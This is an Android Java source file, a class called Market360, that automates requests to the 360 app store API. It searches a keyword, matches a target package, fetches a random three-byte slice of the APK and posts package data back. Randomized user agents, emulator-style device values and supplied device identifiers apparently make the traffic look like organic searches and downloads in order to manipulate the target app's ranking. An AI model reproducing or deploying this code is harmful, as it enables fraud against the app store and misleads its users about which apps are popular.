package com.umeng.ad.app;

import java.net.URLEncoder;

import org.apache.http.HttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.params.HttpClientParams;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.params.HttpProtocolParams;
import org.apache.http.protocol.HTTP;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;

import com.umeng.ad.app.u.TimeExtra;

class Market360 extends Market {

	private static final String ACTION_GET_RELATED_WORDS = "http://openboxcdn.mobilem.360.cn/AppStore/getSuggest?model=%1$s&cpu=goldfish&kw=%2$s&count=50&os=%3$s";
	private static final String ACTION_SEARCH_APPS = "http://openbox.mobilem.360.cn/AppStore/newSearch?model=%1$s+Solar&cpu=goldfish&kw=%2$s&start=0&count=50&os=%3$s&mid=%4$s&inp=%2$s&fm=home_5_6&m=%4$s&m2=%5$s";
	private static final String ACTION_GET_APP_INFO_BY_ID = "http://openboxcdn.mobilem.360.cn/mintf/getAppInfoByIds?pname=%1$s&market_id=360market&si=%2$s&fm=home_5_6_3&m=%3$s&m2=%4$s";
	private static final String ACTION_GET_APP_INFO_BY_CORP = "http://openboxcdn.mobilem.360.cn/AppStore/getAppsbyCorp?model=%1$s+Solar&cpu=goldfish&corp=%2$s&pname=%3$s&type=0&os=%4$s";
	private static final String ACTION_GET_APPS_BY_PACKNAME = "http://openbox.mobilem.360.cn/mintf/getAppsByPackNames";

	/**
	 * DeviceInfo
	 */
	private DeviceInfo deviceInfo;
	private static String HEADER_http_agent = "";
	private  String param_mid = "";
	private  String param_m2 = "";

	/**
	 * AppInfo
	 */
	private String cookie = "";
	private String APP_KEYWORD;
	private String APP_PACKAGE;
	private String APP_NAME;
	private String APP_PID;
	private String APP_CORP;
	private String APP_VERSION_CODE;
	private String APP_DOWNLOAD_URL;

	public Market360() {
		// TODO Auto-generated constructor stub
	}
	
	public Market360(String packageName) {
		MARKET_NAME = MARKET_360;
		setPackageName(packageName);
	}

	@Override
	protected boolean prepareToRank(Context context) throws Exception {
		deviceInfo = new DeviceInfo(context);
		String userAgent = "android-" + deviceInfo.verCode + "-"
				+ deviceInfo.getScreenSize() + "-GENERIC";
		deviceInfo.setUserAgent(userAgent);
		APP_KEYWORD = getAppKeyword();
		APP_PACKAGE = getPackageName();
		
		// Params
//		param_mid = MD5Utils.string2MD5(deviceInfo.imei).toLowerCase();
//		param_m2 = MD5Utils.string2MD5(System.currentTimeMillis() + "")
//				.toLowerCase();
		HEADER_http_agent = u.randomAgent();

		this.action01GetRelatedWords();
		this.action02SearchApp();
		this.action03GetAppInfoByIds();
		this.action04GetAppInfoByCorp();
		this.action05DownloadAPK();
		return this.action06PostDataToServer();

	}

	private void action01GetRelatedWords() {
		try {
			MLog.v("action01GetRelatedWords");
			String url = String.format(ACTION_GET_RELATED_WORDS,
					deviceInfo.brand, URLEncoder.encode(APP_KEYWORD, "GBK"),
					deviceInfo.verCode);
			MLog.i("url:" + url);
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("http.useragent", HEADER_http_agent);
			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			//
			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			// MLog.v("ContentLenght:"+httpPost.getHeaders("Content-Length")[0].geV);
			HttpResponse response = client.execute(httpPost);
			int statuscode = response.getStatusLine().getStatusCode();
			MLog.i("statusCode:" + statuscode);

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("action01GetRelatedWords=>" + body);
			JSONArray array = new JSONObject(body).getJSONArray("data");
			MLog.i("array:" + array);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void action02SearchApp() {
		try {
			MLog.v("action02SearchApp");
			String url = String.format(ACTION_SEARCH_APPS, deviceInfo.brand,
					URLEncoder.encode(APP_KEYWORD, "GBK"), deviceInfo.verCode,
					param_mid, param_m2);
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("http.useragent", HEADER_http_agent);
			MLog.i("url:" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			// MLog.v("ContentLenght:"+httpPost.getHeaders("Content-Length")[0].geV);
			HttpResponse response = client.execute(httpPost);
			int statuscode = response.getStatusLine().getStatusCode();
			MLog.i("statusCode:" + statuscode);

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("action02SearchApp=>" + body);
			JSONArray array = new JSONObject(body).getJSONArray("data");
			for (int i = 0; i < array.length(); i++) {
				if (APP_PACKAGE.equals(array.getJSONObject(i)
						.getString("apkid"))) {
					APP_DOWNLOAD_URL = array.getJSONObject(i).getString(
							"down_url");
					APP_PID = array.getJSONObject(i).getString("id");
					String times = array.getJSONObject(i).getString(
							"download_times");
					MLog.i("app_pid:" + APP_PID);
					MLog.i("downloadURL:" + APP_DOWNLOAD_URL);
					MLog.i("download times:" + times);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void action03GetAppInfoByIds() {
		try {
			MLog.v("action03GetAppInfoByIds");
			String url = String.format(ACTION_GET_APP_INFO_BY_ID, APP_PACKAGE,
					APP_PID, param_mid, param_m2);
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("http.useragent", HEADER_http_agent);
			MLog.i("url:" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			// MLog.v("ContentLenght:"+httpPost.getHeaders("Content-Length")[0].geV);
			HttpResponse response = client.execute(httpPost);
			int statuscode = response.getStatusLine().getStatusCode();
			MLog.i("statusCode:" + statuscode);

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("action03GetAppInfoByIds=>" + body);
			JSONArray array = new JSONObject(body).getJSONArray("data");
			for (int i = 0; i < array.length(); i++) {
				if (APP_PACKAGE.equals(array.getJSONObject(i)
						.getString("apkid"))) {
					APP_CORP = array.getJSONObject(i).getString("corp");
					APP_NAME = array.getJSONObject(i).getString("name");
					APP_VERSION_CODE = array.getJSONObject(i).getString(
							"version_code");
					APP_DOWNLOAD_URL = array.getJSONObject(i).getString(
							"down_url");
					MLog.i("corp:" + APP_CORP + " version_code:"
							+ APP_VERSION_CODE);
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void action04GetAppInfoByCorp() {
		try {
			MLog.v("action04GetAppInfoByCorp");
			String url = String.format(ACTION_GET_APP_INFO_BY_CORP,
					deviceInfo.brand, URLEncoder.encode(APP_CORP, "GBK"),
					APP_PACKAGE, deviceInfo.verCode);
			HttpGet httpPost = new HttpGet(url);
			httpPost.addHeader("http.useragent", HEADER_http_agent);
			MLog.i("url:" + url);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, false);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			// MLog.v("ContentLenght:"+httpPost.getHeaders("Content-Length")[0].geV);
			HttpResponse response = client.execute(httpPost);
			int statuscode = response.getStatusLine().getStatusCode();
			MLog.i("statusCode:" + statuscode);

			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("action04GetAppInfoByCorp=>" + body);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	/**
	 * Download apk from server
	 * 
	 * @param proxy
	 */
	private void action05DownloadAPK() {
		try {
			MLog.v("DownloadAPK");
			MLog.i("apk:" + APP_DOWNLOAD_URL);
			// Request
			HttpGet httpGet = new HttpGet(APP_DOWNLOAD_URL);
			httpGet.addHeader("http.useragent", HEADER_http_agent);
			int range = ((int) (Math.random() * 300));
			MLog.i("range:" + range + "-" + (range + 2));
			httpGet.addHeader("Range", "bytes=" + range + "-" + (range + 2));

			// Client params
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();
			u.setParamsForHttpConnection(params);
			HttpProtocolParams.setUserAgent(params, "");
			client.setParams(params);

			// Response
			HttpResponse response = client.execute(httpGet);
			int statusCode = response.getStatusLine().getStatusCode();
			MLog.i("status:" + statusCode);
			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("content:" + body);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private boolean action06PostDataToServer() {
		try {
			MLog.v("action06PostDataToServer");
			MLog.i("url:" + ACTION_GET_APPS_BY_PACKNAME);
			HttpPost httpPost = new HttpPost(ACTION_GET_APPS_BY_PACKNAME);

			httpPost.addHeader("http.useragent", HEADER_http_agent);
			httpPost.addHeader("Content-Type",
					"application/x-www-form-urlencoded");

			String content = String.format(
					"ks[]=%1$s|%2$s|0|%3$s&type=2&os=%4$s&i=%5$s", APP_PACKAGE,
					APP_VERSION_CODE,
					URLEncoder.encode(APP_NAME.replace("－", "-"), HTTP.UTF_8),
					deviceInfo.verCode, param_mid);
			MLog.i("content:" + content);
			StringEntity entity = new StringEntity(content, HTTP.UTF_8);
			httpPost.setEntity(entity);

			/**
			 * HttpClient
			 */
			DefaultHttpClient client = new DefaultHttpClient();
			HttpParams params = new BasicHttpParams();

			HttpConnectionParams.setConnectionTimeout(params,
					10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams
					.setSoTimeout(params, 10 * TimeExtra.ONE_SECOND);
			HttpConnectionParams.setSocketBufferSize(params, 8192);
			HttpClientParams.setRedirecting(params, true);
			HttpProtocolParams.setUserAgent(params, deviceInfo.getUserAgent());
			client.setParams(params);

			/**
			 * Execute post
			 */
			HttpResponse response = client.execute(httpPost);
			String body = u.readContentFromHttpResponse(response, HTTP.UTF_8);
			MLog.i("body:" + body);

			JSONObject object = new JSONObject(body);
			if (0 == object.getInt("errno")) {
				MLog.i("errno:0");
				return true;
			}
		} catch (Exception e) {
			e.printStackTrace();
		}

		return false;
	}
	
	public void setParam_mid(String param_mid) {
		this.param_mid = param_mid;
	}
	
	public void setParam_m2(String param_m2) {
		this.param_m2 = param_m2;
	}

	public String getCookie() {
		return cookie;
	}

	public void setCookie(String cookie) {
		this.cookie = cookie;
	}

	@Override
	protected void initAllParams() {
		try {
			String im = params.get("m_im");
			String[] array = im.split("\\|");
			setParam_mid(array[0]);
			setParam_m2(array[1]);
		} catch (Exception e) {
		}
	}

}
